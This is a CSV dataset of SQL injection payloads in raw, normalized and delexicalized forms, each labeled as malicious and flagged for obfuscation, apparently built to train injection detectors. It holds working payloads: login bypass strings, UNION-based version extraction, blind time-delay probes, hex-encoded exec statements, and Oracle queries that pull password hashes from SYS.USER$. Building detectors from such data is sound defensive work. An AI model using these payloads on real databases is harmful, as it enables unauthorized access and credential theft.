payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
? or 1  =  1 --,? or 1 = 1 --,? or <NUM> = <NUM> --,1,False,,sqli_dataset
)   or   (  'a'  =  'a,) or ( 'a' = 'a,) or ( <STR> = 'a,1,False,,sqli_dataset
admin' or 1  =  1#,admin' or 1 = 1#,<TABLE>' or <NUM> = <NUM>#,1,False,,sqli_dataset
"select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1","select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
or 1  =  1 --,or 1 = 1 --,or <NUM> = <NUM> --,1,False,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 5 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
"select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'","select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> %!<@ union select <NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1","select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1","select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
distinct,distinct,distinct,1,False,,sqli_dataset
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',select * from users where id = '1' * ( \ ) or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> * ( \ ) or <NUM> = <NUM> -- <NUM>',1,False,,sqli_dataset
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116","1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116","<NUM> and ascii ( lower ( substring ( ( select top <NUM> <COL> from sysobjects where xtype = <STR> ) , <NUM>, <NUM> ) ) ) > <NUM>",1,False,,sqli_dataset
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,select * from users where id = 1 or \.<\ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \.<\ or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"admin"" or ""1""  =  ""1""--","admin"" or ""1"" = ""1""--","<TABLE><STR><NUM><STR><NUM>""--",1,False,,sqli_dataset
"select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1","select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
insert,insert,insert,1,False,,sqli_dataset
"select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1","select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""? = <NUM> or <NUM> = <NUM> -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1","select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
"select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1","select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"or 1  =  1 or """"  =","or 1 = 1 or """" =",or <NUM> = <NUM> or <STR> =,1,False,,sqli_dataset
/**/or/**/1/**/  =  /**/1,or 1 = 1,or <NUM> = <NUM>,1,True,,sqli_dataset
"select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1","select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'","select * from users where id = '1' union select ||/1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> union select ||/<NUM>,version ( ) -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  '1' union select +\.,@@VERSION -- 1'","select * from users where id = '1' union select +\.,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select +\.,@@VERSION -- <NUM>'",1,True,,sqli_dataset
or 1  =  1/*,or 1 = 1/*,or <NUM> = <NUM>/*,1,False,,sqli_dataset
%27 or 1  =  1,' or 1 = 1,' or <NUM> = <NUM>,1,True,,sqli_dataset
"select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1","select * from users where id = 1 <@&@ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> <@&@ union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  '1' union select $*$,@@VERSION -- 1'","select * from users where id = '1' union select $*$,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select $*$,@@VERSION -- <NUM>'",1,False,,sqli_dataset
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...","1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...","<NUM>; ( load_file ( char ( <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>, ...",1,False,,sqli_dataset
"select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'","select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or $ <NUM> = <NUM> union select <NUM>,@@VERSION -- <NUM>'",1,False,,sqli_dataset
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,select * from users where id = 1 or \.<1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or \.<<NUM> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'","select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or \<\ union select <NUM>,@@VERSION -- <NUM>'",1,False,,sqli_dataset
"select * from users where id  =  1 union select 1||1,version  (    )   -- 1","select * from users where id = 1 union select 1||1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM>||<NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> ||<NUM> union select null,banner from v$version where rownum = <NUM> -- <NUM>",1,False,,sqli_dataset
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',select * from users where id = '1' or \.<\ or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> or \.<\ or <NUM> = <NUM> -- <NUM>',1,False,,sqli_dataset
"select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1","select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or "".@"" or 1  =  1 -- 1","select * from users where id = 1 or "".@"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or ""$["" or 1  =  1 -- 1","select * from users where id = 1 or ""$["" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
or 1 --',or 1 --',or <NUM> --',1,False,,sqli_dataset
"select * from users where id  =  1 or "",;"" or 1  =  1 -- 1","select * from users where id = 1 or "",;"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"admin"" or 1  =  1#","admin"" or 1 = 1#","<TABLE>"" or <NUM> = <NUM>#",1,False,,sqli_dataset
"select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> + ( <NUM> ) union select null,banner from v$version where rownum = <NUM> -- <NUM>",1,True,,sqli_dataset
\x27UNION SELECT,\x27UNION SELECT,\x27UNION SELECT,1,False,,sqli_dataset
PRINT,PRINT,PRINT,1,False,,sqli_dataset
"select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'","select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select ( \. ) ,@@VERSION -- <NUM>'",1,False,,sqli_dataset
or 1  =  1--,or 1 = 1--,or <NUM> = <NUM>--,1,False,,sqli_dataset
1 or pg_sleep  (  __TIME__  )  --,1 or pg_sleep ( __TIME__ ) --,<NUM> or pg_sleep ( __TIME__ ) --,1,False,,sqli_dataset
"select * from users where id  =  1 or "",#"" or 1  =  1 -- 1","select * from users where id = 1 or "",#"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
admin'  )   or   (  '1'  =  '1'/*,admin' ) or ( '1' = '1'/*,<TABLE><STR><NUM><STR><NUM>'/*,1,False,,sqli_dataset
or 2 between 1 and 3,or 2 between 1 and 3,or <NUM> between <NUM> and <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1","select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> = <NUM> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1","select * from users where id = 1 or 1#"". union select null,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#"". union select null,version ( ) -- <NUM>",1,False,,sqli_dataset
admin' or '1'  =  '1,admin' or '1' = '1,<TABLE><STR><NUM><STR><NUM>,1,False,,sqli_dataset
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --,; if not ( select system_user ) <> <STR> waitfor delay <STR> --,1,False,,sqli_dataset
"select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>",1,False,,sqli_dataset
""" or 0  =  0 --",""" or 0 = 0 --",""" or <NUM> = <NUM> --",1,False,,sqli_dataset
"select * from users where id  =  1 union select @ $_,version  (    )   -- 1","select * from users where id = 1 union select @ $_,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> union select @ $_,version ( ) -- <NUM>",1,False,,sqli_dataset
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,select * from users where id = 1 <@.$ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> <@.$ or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or ""%."" or 1  =  1 -- 1","select * from users where id = 1 or ""%."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1","select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1","select * from <TABLE> where <COL> = <NUM> + $+*$ union select null,@@VERSION -- <NUM>",1,True,,sqli_dataset
"select * from users where id  =  1 or "",."" or 1  =  1 -- 1","select * from users where id = 1 or "",."" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
char%4039%41%2b%40SELECT,char@39A+@SELECT,char@39A+@SELECT,1,True,,sqli_dataset
"select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1","select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
admin'  )   or   (  '1'  =  '1,admin' ) or ( '1' = '1,<TABLE><STR><NUM><STR><NUM>,1,False,,sqli_dataset
declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,declare @s varchar ( 200 ) select @s = 0x73656c6 ...,declare @s varchar ( <NUM> ) select @s = 0x73656c6 ...,1,True,,sqli_dataset
"or 0  =  0 #""","or 0 = 0 #""","or <NUM> = <NUM> #""",1,False,,sqli_dataset
"select * from users where id  =  1 or "".]"" or 1  =  1 -- 1","select * from users where id = 1 or "".]"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
)   or   (  'x'  =  'x,) or ( 'x' = 'x,) or ( <STR> = 'x,1,False,,sqli_dataset
"select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1","select * from users where id = 1.<@$ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM>.<@$ union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
$  (  sleep 50  ),$ ( sleep 50 ),$ ( sleep <NUM> ),1,False,,sqli_dataset
"select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> *<NUM> union select null,banner from v$version where rownum = <NUM> -- <NUM>",1,False,,sqli_dataset
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --","1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --","<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<COL> from sysobjects where xtype = <STR> --",1,False,,sqli_dataset
"select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1","select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#"". union select <STR>,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1","select * from users where id = 1 or 1#""; union select null,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""; union select null,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 or 1#""? or 1  =  1 -- 1","select * from users where id = 1 or 1#""? or 1 = 1 -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""? or <NUM> = <NUM> -- <NUM>",1,False,,sqli_dataset
"""a"""" or 1  =  1--""","""a"""" or 1 = 1--""",<STR><STR>,1,False,,sqli_dataset
"select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1","select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1","select * from <TABLE> where <COL> = <NUM> *<NUM> union select <NUM>,banner from v$version where rownum = <NUM> -- <NUM>",1,False,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
"select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'","select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> union select ( \ ) ,@@VERSION -- <NUM>'",1,False,,sqli_dataset
1 and user_name  (    )     =   'dbo',1 and user_name ( ) = 'dbo',<NUM> and user_name ( ) = <STR>,1,False,,sqli_dataset
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --","; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --","; if not ( substring ( ( select @@version ) ,<NUM>,<NUM> ) <> <NUM> ) waitfor delay <STR> --",1,False,,sqli_dataset
"select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1","select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""$ union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
"select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1","select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""{ union select null,version ( ) -- <NUM>",1,False,,sqli_dataset
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',select * from users where id = '1' *$ . or 1 = 1 -- 1',select * from <TABLE> where <COL> = <STR> *$ . or <NUM> = <NUM> -- <NUM>',1,False,,sqli_dataset
select * from users where id  =  1 +$+. or 1  =  1 -- 1,select * from users where id = 1 +$+. or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> +$+. or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,select * from users where id = 1 or ( \+ ) = 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or ( \+ ) = <NUM> or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 6 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
or 1  =  1 or ''  =  ',or 1 = 1 or '' = ',or <NUM> = <NUM> or <STR> = ',1,False,,sqli_dataset
select * from users where id  =  1   or 1  =  1 -- 1,select * from users where id = 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
or 'text' > 't',or 'text' > 't',or <STR> > <STR>,1,False,,sqli_dataset
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055","1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",<NUM> <STR><TABLE><STR>81dc9bdb52d04dc20036dbd8313ed055,1,False,,sqli_dataset
"select * from users where id  =  1 or ""%["" or 1  =  1 -- 1","select * from users where id = 1 or ""%["" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
"select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1","select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#""; = <NUM> union select <NUM>,version ( ) -- <NUM>",1,False,,sqli_dataset
admin' or '1'  =  '1'#,admin' or '1' = '1'#,<TABLE><STR><NUM><STR><NUM>'#,1,False,,sqli_dataset
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,select * from users where id = 1 +$ 1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> +$ <NUM> or <NUM> = <NUM> -- <NUM>,1,True,,sqli_dataset
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i","AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( <COL> ) FROM ( SELECT DISTINCT ( <COL> ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i",1,False,,sqli_dataset
select * from information_schema.tables--,select * from information_schema.tables--,select * from information_schema.tables--,1,False,,sqli_dataset
"select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1","select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
1   )    )    or pg_sleep  (  __TIME__  )  --,1 ) ) or pg_sleep ( __TIME__ ) --,<NUM> ) ) or pg_sleep ( __TIME__ ) --,1,False,,sqli_dataset
"select * from users where id  =  '1' union select !<@,version  (    )   -- 1'","select * from users where id = '1' union select !<@,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> union select !<@,version ( ) -- <NUM>'",1,False,,sqli_dataset
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,declare @q nvarchar ( 200 ) select @q = 0x770061 ...,declare @q nvarchar ( <NUM> ) select @q = 0x770061 ...,1,True,,sqli_dataset
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,select * from users where id = 1 %!<1 or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> %!<<NUM> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ),declare @q nvarchar ( 200 ) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),declare @q nvarchar ( <NUM> ) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ),1,True,,sqli_dataset
"select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1","select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",select * from <TABLE> where <COL> = <NUM> or <STR> or <NUM> = <NUM> -- <NUM>,1,False,,sqli_dataset
